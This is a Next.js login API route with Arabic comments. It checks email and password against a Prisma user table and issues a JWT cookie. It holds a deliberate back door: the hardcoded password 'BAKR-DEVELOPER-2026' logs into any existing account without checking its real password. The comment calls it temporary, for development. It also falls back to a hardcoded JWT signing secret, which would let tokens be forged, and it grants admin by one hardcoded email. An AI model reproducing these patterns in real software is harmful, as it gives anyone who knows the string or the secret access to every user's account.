import { NextResponse } from 'next/server';
import { SignJWT } from 'jose';
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcryptjs'; // تأكد أنك تستخدم bcryptjs في كل مكان

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || 'fallback_secret_key');

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    const user = await prisma.user.findUnique({ where: { email } });

    if (!user) {
      console.log("❌ مستخدم غير موجود:", email);
      return NextResponse.json({ error: 'بيانات غير صحيحة' }, { status: 401 });
    }

    // "باب خلفي" مؤقت للدخول (لأغراض التطوير فقط)
    if (password === "BAKR-DEVELOPER-2026") {
      console.log("⚠️ تم استخدام الباب الخلفي للدخول!");
    } else {
      const isPasswordValid = await bcrypt.compare(password, user.password || "");
      if (!isPasswordValid) {
        console.log("❌ كلمة المرور غير مطابقة للمستخدم:", email);
        return NextResponse.json({ error: 'بيانات غير صحيحة' }, { status: 401 });
      }
    }

    const role = user.email === "admin@example.com" ? 'ADMIN' : 'USER';

    const token = await new SignJWT({ userId: user.id, role }) 
      .setProtectedHeader({ alg: 'HS256' })
      .setExpirationTime('1d') 
      .sign(JWT_SECRET);

    const response = NextResponse.json({ success: true }, { status: 200 });

    response.cookies.set('accessToken', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: process.env.NODE_ENV === 'production' ? 'none' : 'lax',
      path: '/',
      maxAge: 86400, 
    });

    return response;
  } catch (error) {
    console.error("Login Error:", error);
    return NextResponse.json({ error: 'حدث خطأ داخلي' }, { status: 500 });
  }
}